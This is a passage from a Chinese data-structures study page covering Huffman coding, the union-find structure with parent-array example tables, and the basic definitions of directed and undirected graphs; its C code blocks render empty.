<p>由哈夫曼树得到哈夫曼编码是很自然的过程。首先，将每个出现的字符当作一个独立的结点，其权值为它出现的频度（或次数），构造出对应的哈夫曼树。显然，所有字符结点都出现在叶结点中。可将字符的编码解释为从根至该字符的路径上边标记的序列，其中边标记为 <code>0</code> 表示 “转向左孩子”，标记为 <code>1</code> 表示 “转向右孩子”。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>0</code> 和 <code>1</code> 究竟是表示左子树还是右子树没有明确规定。左、右孩子结点的顺序是任意的，所以构造出的哈夫曼树并不唯一，但各哈夫曼树的带权路径长度 WPL 相同且为最优。此外，如有若干权值相同的结点，则构造出的哈夫曼树更可能不同，但 WPL 必然相同且是最优的</p>
</div>
</li>
</ol>
<h4> 并查集</h4>
<p>并查集是一种简单的集合表示，它支持以下三种操作：</p>
<ol>
<li><strong>Initial(S)</strong>：将集合 <code>S</code> 中的每个元素都初始化为只有一个单元素的子集合</li>
<li><strong>Union(S, Root1, Root2)</strong>：把集合 <code>S</code> 中的子集合 Root2 并入子集合 Root1 要求 Root1 和 Root2 互不相交，否则不执行合并</li>
<li><strong>Find(S, x)</strong>：查找集合 <code>S</code> 中单元素 <code>x</code> 所在的子集合，并返回该子集合的根结点</li>
</ol>
<p>通常用树（森林）的双亲表示作为并查集的存储结构，每个子集合以一棵树表示。所有表示子集合的树，构成表示全集合的森林，存放在双亲表示数组内。通常用数组元素的下标代表元素名，用根结点的下标代表子集合名，根结点的双亲结点为负数。</p>
<p>例如，若设有一个全集合为 <code>S = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}</code>，初始化时每个元素自成一个单元素子集合，每个子集合的数组值为 <code>-1</code>。初始化时树形存储结构如下所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">0</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
<th style="text-align:center">6</th>
<th style="text-align:center">7</th>
<th style="text-align:center">8</th>
<th style="text-align:center">9</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">-1</td>
</tr>
</tbody>
</table>
<p>经过一段时间的计算，这些子集合合并为 <code>3</code> 个更大的子集合 S<sub>1</sub> = {0, 6, 7, 8}，S<sub>2</sub> = {1, 4, 9}，S<sub>3</sub> = {2, 3, 5}，此时并查集的树形存储结构如下所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">0</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
<th style="text-align:center">6</th>
<th style="text-align:center">7</th>
<th style="text-align:center">8</th>
<th style="text-align:center">9</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-4</td>
<td style="text-align:center">-3</td>
<td style="text-align:center">-3</td>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
</tbody>
</table>
<p>为了得到两个子集合的并，只需将其中一个子集合根结点的双亲指针指向另一个集合的根结点。因此，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">S_{1} \cup S_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> = {0, 6, 7, 8, {1, 4, 9}} 可以具有如下所示的表示。</p>
<table>
<thead>
<tr>
<th style="text-align:center">0</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
<th style="text-align:center">6</th>
<th style="text-align:center">7</th>
<th style="text-align:center">8</th>
<th style="text-align:center">9</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-7</td>
<td style="text-align:center">0</td>
<td style="text-align:center">-3</td>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
</tbody>
</table>
<p>在采用树的双亲指针数组表示作为并查集的存储表示时，集合元素的编号从 0 到 SIZE-1。其中 SIZE 是最大元素的个数。下面是并查集主要运算的实现。</p>
<p>并查集的结构定义如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>并查集的初始化操作（S 即为并查集）：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Find 操作（函数在并查集 S 中查找并返回包含元素 x 的树的根）：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>判断两个元素是否属于同一集合，只需分别找到它们的根结点，比较根结点是否相同即可。</p>
<p>Union 操作（函数求两个不相交子集合的并集）：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果将两个元素所在的集合合并为一个集合，那么就需要先找到两个元素的根结点。</p>
<h2> 图</h2>
<h3> 图的基本概念</h3>
<p>图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 由顶点集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 和边集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span> 组成，记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>V</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G = (V, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(G)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mclose">)</span></span></span></span> 表示图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中顶点的有限非空集；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(G)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mclose">)</span></span></span></span> 表示图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中顶点之间的关系（边）集合。若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><mrow><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>v</mi><mi>n</mi></msub></mrow></mrow><annotation encoding="application/x-tex">V = {v_{1}, v_{2}, \dotsc, v_{n}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 则用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|V|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span></span></span></span> 表示图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中顶点的个数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi>u</mi><mo>∈</mo><mi>V</mi><mo separator="true">,</mo><mi>v</mi><mo>∈</mo><mi>V</mi></mrow></mrow><annotation encoding="application/x-tex">E = {(u, v) | u \in V, v \in V}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> 用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|E|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span></span></span></span> 表示图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中边的条数。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>线性表可以是空表，树可以是空树，但图不可以是空图。就是说，图中不能一个顶点也没有，图的顶点集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 一定非空，但边集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span> 可以为空，此时图中只有顶点而没有边</p>
</div>
<p>下面是图的一些基本概念及术语。</p>
<ol>
<li>
<p><strong>有向图</strong></p>
<p>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span> 是有向边（也称 <strong>弧</strong>）的有限集合时，则图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 为有向图。弧是顶点的有序对，记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;v, w&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mo separator="true">,</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">v, w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 是顶点，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 称为弧尾，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 称为弧头，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;v, w&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 称为从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 的弧，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;v, w&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 也称 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 邻接到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>。</p>
</li>
<li>
<p><strong>无向图</strong></p>
<p>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span> 是无向边（简称 <strong>边</strong>）的有限集合时，则图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 为无向图。边是顶点的无序对，记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(v, w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>w</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(w, v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span>。可以说 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 互为邻接点。边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(v, w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span> 依附于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>，或称边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(v, w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mo separator="true">,</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">v, w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 相关联。</p>
</li>
<li>
<p><strong>简单图、多重图</strong></p>
